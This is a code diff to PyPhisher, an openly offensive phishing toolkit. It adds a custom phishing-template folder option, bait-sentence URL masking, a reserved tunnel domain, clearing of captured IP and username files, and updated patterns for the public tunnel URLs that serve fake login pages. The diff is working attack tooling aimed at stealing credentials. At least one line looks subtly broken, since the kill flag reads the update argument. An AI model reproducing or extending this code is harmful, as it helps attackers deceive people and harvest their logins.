@@ -280,6 +280,8 @@ argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"Py
 argparser.add_argument("-o", "--option", help="PyPhisher's template index [Default : null]")
 argparser.add_argument("-t", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
 argparser.add_argument("-r", "--region", help="Region for loclx [Default: auto]")
+argparser.add_argument("-f", "--folder", help="Folder path for custom (Default: null)")
+argparser.add_argument("-d", "--domain", help="Domain for loclx [Pro Account] (Default: null)")
 argparser.add_argument("-s", "--subdomain", help="Subdomain for loclx [Pro Account] (Default: null)")
 argparser.add_argument("-u", "--url", help="Redirection url after data capture [Default : null]")
 argparser.add_argument("-m", "--mode", help="Mode of PyPhisher [Default: normal]")
@@ -287,20 +289,24 @@ argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [De
 argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
 argparser.add_argument("--kshrt", help="Show kshrt url [Default: False]", action="store_true")
 argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")
+argparser.add_argument("--nokill", help="Skip killing services [Default : False]", action="store_false")
 
 
 args = argparser.parse_args()
 
 port = args.port
 option = args.option
+custom_folder = args.folder
 region = args.region
 subdomain = args.subdomain
+domain = args.domain
 tunneler = args.tunneler
 url = args.url
 mode = args.mode
 troubleshoot = args.troubleshoot
 key = args.nokey if mode != "test" else False
 update = args.noupdate
+kill = args.noupdate
 kshrt = args.kshrt
 
 local_url = f"127.0.0.1:{port}"
@@ -583,7 +589,7 @@ def installer(package, package_name=None):
 def killer():
     # Previous instances of these should be stopped
     for process in processes:
-        if is_running(process):
+        if kill and is_running(process):
             # system(f"killall {process}")
             output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
             if " " in output:
@@ -753,7 +759,7 @@ def write_redirect():
             sed("redirectUrl", redirect_url, f"{site_dir}/login.php")
             break
         if redirect_url == "help":
-            sprint(shadow_help)
+            sprint(redir_help)
 
 # Add more templates from zipfile from url
 def add_zip():
@@ -881,8 +887,8 @@ def kshrten(url):
     for key in route_map.keys():
         if key in url:
             route = route_map[key]
-            subdomain = url.replace("https://", "").replace(key, "")
-    website = f"https://kshrt.onrender.com/{route}/{subdomain}"
+            link = url.replace("https://", "").replace(key, "")
+    website = f"https://kshrt.onrender.com/{route}/{link}"
     internet()
     try:
         res = post(website, timeout=30).text
@@ -938,8 +944,9 @@ def shortener3(url):
     
 # Copy website files from custom location
 def customfol():
-    global mask
-    while True:
+    global mask, custom_folder
+    delete(site_dir)
+    while custom_folder is None:
         has_files = input(f"\n{ask}Do you have custom site files?[y/N/b] > {green}")
         if has_files == "y":
             fol = input(f"\n{ask}Enter the directory > {green}")
@@ -961,6 +968,23 @@ def customfol():
             sprint(f"\n{info}Contact \x4b\x61\x73\x52\x6f\x75\x64\x72\x61")
             bgtask("xdg-open https://t.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61")
             pexit()
+    else:
+        while True:
+            if isdir(custom_folder):
+                if isfile(f"{custom_folder}/index.php") or isfile(f"{custom_folder}/index.html"):
+                    inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
+                    # Remove slash and spaces from mask
+                    mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
+                    delete(f"{custom_folder}/ip.txt", f"{custom_folder}/usernames.txt")
+                    copy(custom_folder, site_dir)
+                    return custom_folder
+                else:
+                    sprint(f"\n{error}index.php/index.html is required but not found!")
+            else:
+                sprint(f"\n{error}Directory doesn't exist!")
+                custom_folder = input(f"\n{ask}Enter the directory > {green}")
+
+
 
 # Show saved data from saved file with small decoration
 def saved():
@@ -1357,6 +1381,8 @@ def server():
     arguments = ""
     if region is not None:
         arguments = f"--region {region}"
+    if domain is not None:
+        arguments = f"{arguments} --reserved-domain {domain}"
     if subdomain is not None:
         arguments = f"{arguments} --subdomain {subdomain}"
     bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
@@ -1383,14 +1409,14 @@ def server():
         sleep(1)
     lhr_success = False
     for _ in range(10):
-        lhr_url = grep("(https://[-0-9a-z.]*.lhr.(life|pro))", lhr_file)
+        lhr_url = grep("(https://[-0-9a-z.]*.lhr.(life|pro|rocks))", lhr_file)
         if lhr_url != "":
             lhr_success = True
             break
         sleep(1)
     svo_success = False
     for _ in range(10):
-        svo_url = grep("(https://[-0-9a-z.]*.serveo.net)", svo_file)
+        svo_url = grep("(https://[-0-9a-z.]*.serveouserconent.com)", svo_file)
         if svo_url != "":
             svo_success = True
             break
